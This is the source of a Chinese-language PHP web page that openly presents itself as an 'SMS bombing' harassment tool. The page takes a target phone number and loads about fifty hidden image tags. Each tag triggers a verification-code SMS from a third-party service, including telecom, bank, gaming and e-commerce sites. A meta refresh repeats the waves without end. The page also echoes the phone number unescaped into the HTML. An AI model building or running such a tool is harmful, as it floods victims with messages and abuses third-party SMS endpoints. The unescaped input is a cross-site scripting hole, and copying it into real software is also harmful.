<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <title>在线短信测压-手机短信轰炸</title>
    <link rel="icon" href="https://static.kkk.plus/favicon/favicon.png" sizes="23x23" type="image/x-icon">
    <meta name="keywords" content="短信轰炸平台,免费短信轰炸,短信炸弹,云呼短信,云端短信,在线短信测压,短信攻击,电话轰炸">
    <meta name="description" content="短信轰炸平台,免费短信轰炸,短信炸弹,云呼短信,云端短信,在线短信测压,短信攻击,电话轰炸>
    <link href="http://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <link href="http://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/plugins.css">
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="css/oneui.css"> 
    <link rel="stylesheet" href="css/common.css">
    <script type="text/javascript" src="js/jquery-1.7.min.js"></script>
    <script src="js/modernizr.min.js"></script>
    
    <style>
        body {
            background-color: rgb(53, 54, 58)
            }
        .shuaibi-tip {
            background: #fafafa repeating-linear-gradient(-45deg,#fff,#fff 1.125rem,transparent 1.125rem,transparent 2.25rem);
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);
            margin: 20px 0px;
            padding: 15px;
            border-radius: 5px;
            font-size: 14px;
            color: #555555;
            }
    </style>
</head>

<body>
<br>
<div class="container">
<div class="panel panel-success">
    <div class="panel-heading">
        <h3 class="panel-title">轰炸控制台</h3>
    </div>
    <div class="input-group">
        <span class="input-group-addon input-lg">轰炸</span>
		<form method="GET" action="super.php">
        <input type="text" name="hm" maxlength="11" class="form-control input-lg" placeholder="输入需要轰炸的手机号" value="" />
    </div>
		<div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">启动轰炸线程</button>
		<!--<button type="button" class="btn btn-success" onclick="top.location='super.php'">停止轰炸线程</button>
		<button type="button" class="btn btn-info" onclick="top.location='super.html'">★多开模式</button>-->
		
		</div>
		</form>

<div class="bs-callout bs-callout-info">
    
</div>
</div>
<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a-1;
$d=$_GET['hm'];
?>
<?php
if($d>1){
	echo "<br /><div class='progress progress-striped active'>
            <div class='progress-bar progress-bar-success' style='width: 100%'>轰炸进行中</div>
        </div>";
	echo "<center><h8><i class='glyphicon glyphicon-refresh text-info fa-spin'></i>&nbsp;<font color='#6699FF'>短信轰炸已启动,  对<strong>$d</strong>,已经发起第<strong>$a</strong>波短信-请静静的等待几秒钟查看效果,即将开始第下一波轰炸。<hr></h8></font></center>";
    echo "<div style='display:none'>
      <img src='http://zhengshi.qipeisq.com/regajax/sendsmsreg?mb=$d' alt='' />
<img src='http://shop.aimeilife.com/api/v5/Auth/SendVerification?phone=$d' alt='' />
<img src='https://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=&cururl=http%3A%2F%2Freg.ztgame.com%2F&phone=$d&mpcode=&pwd=&tname=&idcard=' alt='' />
<img src='https://api.hetao101.com/login/v2/account/oauth/verifyCode?phoneNumber=$d' alt='' />
<img src='https://dss.xiaoyezi.com/student_app/auth/validate_code?mobile=$d&country_code=86' alt='' />
<img src='http://lemonwifi.cn/portal/verification.ajax?mobile=$d' alt='' />
<img src='https://uc.csdhe.com/v1/sms/send?mobile=$d&apptype=examWeb' alt='' />
<img src='http://www.cnppump.ltd/Service/UserHandler.ashx?cmd=GetTelVerifyCode4Regit&Tel=$d&Auth=da64c1884a2f4fa48a75a4d960bc12eb&SoftType=Web&_=1662043243269' alt='' />
<img src='https://www.yojiang.cn/api/user/send_verify_code?phone=$d' alt='' />
<img src='https://user.daojia.com/mobile/getcode?mobile=$d&newVersion=1&bu=101' alt='' />
<img src='https://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone=$d&appId=www_home&v=1&sig=&t=1662044138185&v=1' alt='' />
<img src='https://pass.cctalk.com/intraApi/v1/sms/send?action=SendMsg&mobile=%2B86-$d' alt='' />
<img src='https://card.10010.com/ko-order/messageCaptcha/send?phoneVal=$d' alt='' />
<img src='https://h5.17k.com/ck/user/mobile/$d/message?smsType=1&appKey=1351550300' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=0' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=7' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=6' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=5' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=4' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=3' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=2' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=1' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=9' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=10' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=11' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=12' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=13' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=14' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=15' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=16' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=17' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=18' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=19' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=20' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=21' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=22' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=23' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=24' alt='' />
<img src='http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=$d&type=25' alt='' />
<img src='https://www.doc88.com/doc.php?act=send_sms&type=0&phone=$d' alt='' />
<img src='https://mobile.cmbchina.com/DUserManage/UserRegisterNew/URN_Register.aspx?$=1&PhoneNo=$d&ClientNo=f20c5365321b4411a0ae4aa8d5ddd608&Command=CMD_SENGMSGCODE' alt='' />
<img src='https://hapi.00bang.cn/llb/oauth/llb/getLoginSmsCode?mobile=$d' alt='' />
<img src='https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile=$d&imgcode=&sendtype=quicklogin&hpquid=q22-j-14&user_domain=hj&sub_user_domain=&business_domain=yyy_class&callback=cbb467d8' alt='' />
<img src='https://www.tanwan.com/api/reg_json_2019.php?act=3&phone=$d&callback=jQuery112005094453070699978_1639928758626&_=1639928758629' alt='' />
<img src='https://www.tanwan.com/api/reg_json_2019.php?act=3&phone=$d&callback=jQuery112003247368730630804_1643269992344&_=1643269992347' alt='' />
<img src='https://changba.com/official_login.php?ac=start_phone_entry&phone=$d' alt='' />
<img src='https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone=$d&Captcha=&_=1627172292814' alt='' />
<img src='https://ershoucheapi.58.com/cheyuan/comm/smsCode.do?callback=jQuery17208815301240499984_1623173514122&phone=$d&code=send&_=1623173533089' alt='' />
</div>
	";
     echo"<meta http-equiv=refresh content='0; url=super.php?hm=$d&amp;c=$a'>";
}else{
}
?>
<!--
<div class="tab-pane" id="search">
              <table class="table table-striped table-borderless table-vcenter remove-margin-bottom">
         <tbody>
            <tr class="shuaibi-tip animation-bigEntrance">
                <td class="text-center" style="width: 100px;">
                    <img src="http://q4.qlogo.cn/headimg_dl?dst_uin=908819363&spec=100" alt="avatar" class="img-circle img-thumbnail img-thumbnail-avatar">
                </td>
                <td>
                    <h4><strong>站长</strong></h4>
					<i class="fa fa-fw fa-qq text-primary"></i>908819363<br><i class="fa fa-fw fa-history text-danger"></i>问题请联系客服
                </td>
                <td class="text-right" style="width: 20%;">
                    <a href="#lxkf" target="_blank" data-toggle="modal" class="btn btn-sm btn-info">点击联系</a>
                </td>
            </tr>
         </tbody>
        </table>
		<br>
		
			<span class="label label-primary">事项1:</span> 本站永久免费提供，具体其他说明请点击公告查看！<p></p><p></p><span class="label label-success">事项2:</span> 输入号码点击轰炸即可开始轰炸<p></p><p></p><span class="label label-warning">事项3:</span> 关闭网页或者点击停止几分钟后即可停止轰炸<p></p><p></p><span class="label label-danger">事项4:</span> 请勿用于非法用途后果本站概不负责		</div>
			
					
            <br>
			<div id="result2" class="form-group" style="display:none;">
              <center><small><font color="#ff0000">手机用户可以左右滑动</font></small></center>
				
	
   </div> 

<div class="tab-pane animation-fadeInQuick2" id="Substation">
<table class="table table-borderless table-pricing">
            <tbody>
                
                <tr>
                    <td><img src="img/hz.png" width="280" height="280"/></td>
                </tr>
				
                
            </tbody>
        </table>
    
	</div>

<div class="tab-pane" id="more">
    <div class="row">
		
		<div class="col-sm-6">
            <a href="https://www.hcw3.cn" target="_blank" class="widget">
                <div class="widget-content themed-background-info text-right clearfix" style="color: #fff;">
                    <div class="widget-icon pull-left">
                        <i class="fa fa-apple"></i>
                    </div>
                    <h2 class="widget-heading h3">
                        <strong>红尘资源网</strong>
                    </h2>
                    <span>点击进入</span>
                </div>
            </a>
        </div>
	</div>
</div>
-->
<!--更多按钮结束-->
</div>
</div>



<script src="http://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
<script src="http://cdn.staticfile.org/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
<script src="http://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script src="http://cdn.staticfile.org/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
<script src="http://cdn.staticfile.org/layer/2.3/layer.js"></script>
<script src="js/app.js"></script>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
<!-- DT Time -->
<!--</body>-->
</body>
</html>
